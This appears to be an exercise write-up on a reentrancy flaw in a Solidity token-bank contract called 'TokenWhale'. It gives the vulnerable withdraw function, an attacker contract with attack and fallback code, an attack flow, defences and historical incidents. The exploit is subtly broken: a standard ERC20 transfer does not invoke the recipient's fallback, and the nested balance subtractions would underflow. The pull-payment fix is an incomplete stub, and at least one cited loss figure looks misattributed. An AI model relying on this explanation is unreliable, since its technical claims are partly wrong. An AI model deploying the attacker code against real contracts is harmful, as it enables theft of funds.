# Token Whale Reentrancy Attack Solution

## Overview

This exercise demonstrates a classic reentrancy vulnerability in a token bank contract. The `TokenWhale` contract allows users to deposit and withdraw ERC20 tokens, but the `withdraw` function is vulnerable to reentrancy attacks due to improper state management.

## The Vulnerability


### Root Cause
The vulnerability exists in the `withdraw` function of the `TokenWhale` contract:

```solidity
function withdraw(address token, uint256 amount) external {
    uint256 userBalance = balances[token][msg.sender];
    require(userBalance >= amount, "Insufficient balance");
    
    // VULNERABILITY: External call before state update
    bool success = IToken(token).transfer(msg.sender, amount);
    require(success, "Token transfer failed");
    
    // State update happens AFTER the external call (vulnerable to reentrancy)
    balances[token][msg.sender] -= amount;
}
```

**The Problem**: The contract makes an external call (`IToken(token).transfer()`) before updating the internal state (`balances[token][msg.sender] -= amount`). This creates a window where an attacker can re-enter the function and drain funds.

### Why This Happens
1. **External Call First**: The contract transfers tokens to the caller
2. **State Update After**: The balance is only updated after the transfer
3. **Reentrancy Window**: Between the transfer and balance update, the attacker can call `withdraw` again
4. **Recursive Drain**: Each call sees the old balance, allowing multiple withdrawals

## The Attack

### Attack Contract: `TokenWhaleAttacker`

The attacker contract exploits this vulnerability through the following steps:

1. **Setup**: Deposit tokens into the vulnerable contract
2. **Initiate Attack**: Call `withdraw` to start the attack
3. **Reentrancy**: Use `fallback()` or `receive()` to re-enter during token transfer
4. **Drain**: Continue withdrawing until the contract is empty

### Key Components

#### Attack Initialization
```solidity
function attack(uint256 attackAmount) external {
    // Transfer tokens from attacker to this contract
    IToken(targetToken).transferFrom(msg.sender, address(this), attackAmount);
    
    // Approve TokenWhale to spend our tokens
    IToken(targetToken).approve(address(tokenWhale), attackAmount);
    
    // Deposit tokens into TokenWhale
    tokenWhale.deposit(targetToken, attackAmount);
    
    // Start the reentrancy attack
    attacking = true;
    tokenWhale.withdraw(targetToken, attackAmount);
    attacking = false;
}
```

#### Reentrancy Logic
```solidity
fallback() external {
    if (attacking) {
        uint256 whaleBalance = tokenWhale.getTotalBalance(targetToken);
        uint256 myBalance = tokenWhale.getBalance(targetToken, address(this));
        
        if (whaleBalance > 0 && myBalance > 0) {
            // Re-enter the withdraw function before the state is updated
            tokenWhale.withdraw(targetToken, myBalance);
        }
    }
}
```

## Attack Flow

1. **Attacker deposits 100 tokens** into TokenWhale
2. **Attacker calls `withdraw(100)`**
3. **TokenWhale checks balance**: `balances[token][attacker] = 100` ✓
4. **TokenWhale transfers 100 tokens** to attacker
5. **Attacker's `fallback()` is triggered** during the transfer
6. **Attacker re-enters `withdraw(100)`** before balance is updated
7. **TokenWhale checks balance again**: `balances[token][attacker] = 100` ✓ (still old value!)
8. **TokenWhale transfers another 100 tokens**
9. **Process repeats** until TokenWhale is drained

## Impact

- **Fund Drainage**: Attacker can drain all tokens from the contract
- **Recursive Exploitation**: Each deposit can be withdrawn multiple times
- **Economic Loss**: Legitimate users lose their deposited tokens

## Prevention

### 1. Checks-Effects-Interactions Pattern
Update state before making external calls:

```solidity
function withdraw(address token, uint256 amount) external {
    uint256 userBalance = balances[token][msg.sender];
    require(userBalance >= amount, "Insufficient balance");
    
    // SECURE: Update state BEFORE external call
    balances[token][msg.sender] -= amount;
    
    // Make external call after state update
    bool success = IToken(token).transfer(msg.sender, amount);
    require(success, "Token transfer failed");
}
```

### 2. Reentrancy Guard
Use a modifier to prevent reentrancy:

```solidity
bool private locked;

modifier noReentrant() {
    require(!locked, "No reentrancy allowed");
    locked = true;
    _;
    locked = false;
}

function withdraw(address token, uint256 amount) external noReentrant {
    // ... function logic
}
```

### 3. Pull Payment Pattern
Let users withdraw their own funds instead of pushing:

```solidity
mapping(address => uint256) public pendingWithdrawals;

function requestWithdrawal(address token, uint256 amount) external {
    // Update state immediately
    balances[token][msg.sender] -= amount;
    pendingWithdrawals[msg.sender] += amount;
}

function withdrawFunds() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    pendingWithdrawals[msg.sender] = 0;
    // Transfer to user
}
```

## Testing the Attack

### Setup
1. Deploy `MockToken` with initial supply
2. Deploy `TokenWhale` contract
3. Deploy `TokenWhaleAttacker` with TokenWhale and token addresses
4. Transfer tokens to attacker contract
5. Call `attack()` function

### Expected Result
- Attacker contract should drain all tokens from TokenWhale
- Multiple withdrawals occur from a single deposit
- TokenWhale's balance goes to zero

## Real-World Examples

- **The DAO Hack (2016)**: $60M drained through reentrancy
- **Lendf.me (2020)**: $25M stolen via reentrancy attack
- **Cream Finance (2021)**: $130M lost to reentrancy

## Key Takeaways

1. **Always update state before external calls**
2. **Use reentrancy guards for critical functions**
3. **Follow the Checks-Effects-Interactions pattern**
4. **Test thoroughly with malicious contracts**
5. **Consider using established libraries like OpenZeppelin**

This vulnerability demonstrates why proper state management and external call ordering are crucial for smart contract security.
